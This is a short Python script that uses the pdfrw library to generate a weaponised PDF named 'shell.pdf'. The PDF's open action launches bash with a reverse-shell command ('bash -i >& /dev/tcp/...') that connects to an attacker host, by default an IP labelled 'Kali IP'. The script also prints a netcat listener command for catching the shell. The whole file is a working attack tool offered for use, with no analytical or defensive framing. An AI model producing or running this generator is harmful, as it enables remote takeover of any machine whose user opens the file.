import pdfrw
import sys

LHOST = '192.168.1.100'  # Kali IP
LPORT = '4444'

OUTPUT = 'shell.pdf'


def make_reverse_shell_pdf(lhost, lport, output):
    cmd = f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'

    template = pdfrw.PdfReader('blank.pdf')
    launch_obj = pdfrw.PdfDict(
        S=pdfrw.PdfName('Launch'),
        F=pdfrw.PdfString('/bin/bash'),
        P=pdfrw.PdfString(f'-c "{cmd}"')
    )
    template.Root.OpenAction = launch_obj
    pdfrw.PdfWriter().write(output, template)
    print(f'Written: {output}')
    print(f'Listener: nc -lvnp {lport}')


if __name__ == '__main__':
    if len(sys.argv) == 3:
        LHOST, LPORT = sys.argv[1], sys.argv[2]
    make_reverse_shell_pdf(LHOST, LPORT, OUTPUT)
